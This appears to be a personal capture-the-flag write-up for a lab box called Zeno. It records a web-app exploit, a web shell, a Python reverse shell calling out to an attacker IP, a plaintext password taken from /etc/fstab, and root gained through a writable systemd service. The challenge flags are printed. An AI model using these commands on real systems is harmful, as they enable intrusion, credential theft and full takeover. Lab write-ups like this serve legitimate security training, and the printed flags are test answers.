# Zeno 

> VOiD | Saturday 23 October 2021 07:02:23 PM IST

My IP : 10.10.101.2
Target IP : 


## PORT 12340 []

http://10.10.101.2:12340/rms/
```bash
https://www.exploit-db.com/exploits/47520
searchsploit -m php/webapps/47520.py

python3 -m http.server 8080
python3 exploit.py http://10.10.101.2:12340/rms/

http://10.10.101.2:12340/rms/images/reverse-shell.php

view-source:http://10.10.101.2:12340/rms/images/reverse-shell.php?cmd=cat%20/etc/passwd
edward:x:1000:1000::/home/edward:/bin/bash
root:x:0:0:root:/root:/bin/bash


python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

```

```bash
cat ./connection/config.php
<?php
    define('DB_HOST', 'localhost');
    define('DB_USER', 'root');
    define('DB_PASSWORD', '');
    define('DB_DATABASE', 'rms');
    define('APP_NAME', 'Pathfinder Hotel');


bash-4.2$ cat /etc/fstab

#
# /etc/fstab
# Created by anaconda on Tue Jun  8 23:56:31 2021
#
# Accessible filesystems, by reference, are maintained under '/dev/disk'
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
/dev/mapper/centos-root	/	xfs	defaults	0 0
UUID=507d63a9-d8cc-401c-a660-bd57acfd41b2	/boot	xfs	defaults	0 0
/dev/mapper/centos-swap	swap	swap	defaults	0 0
#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft	0 0

```

> edward:FrobjoodAdkoonceanJa

```bash
[edward@zeno ~]$ cat user.txt 
THM{070cab2c9dc622e5d25c0709f6cb0510}


[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/zeno-monitoring.service
/etc/systemd/system/zeno-monitoring.service

User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot


vi /etc/systemd/system/zeno-monitoring.service

ExecStart=/bin/sh /tmp/script.sh
ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/rooter; chmod +xs /home/edward/rooter'
sudo /usr/sbin/reboot
```

```bash
cat root.txt 
THM{b187ce4b85232599ca72708ebde71791}
```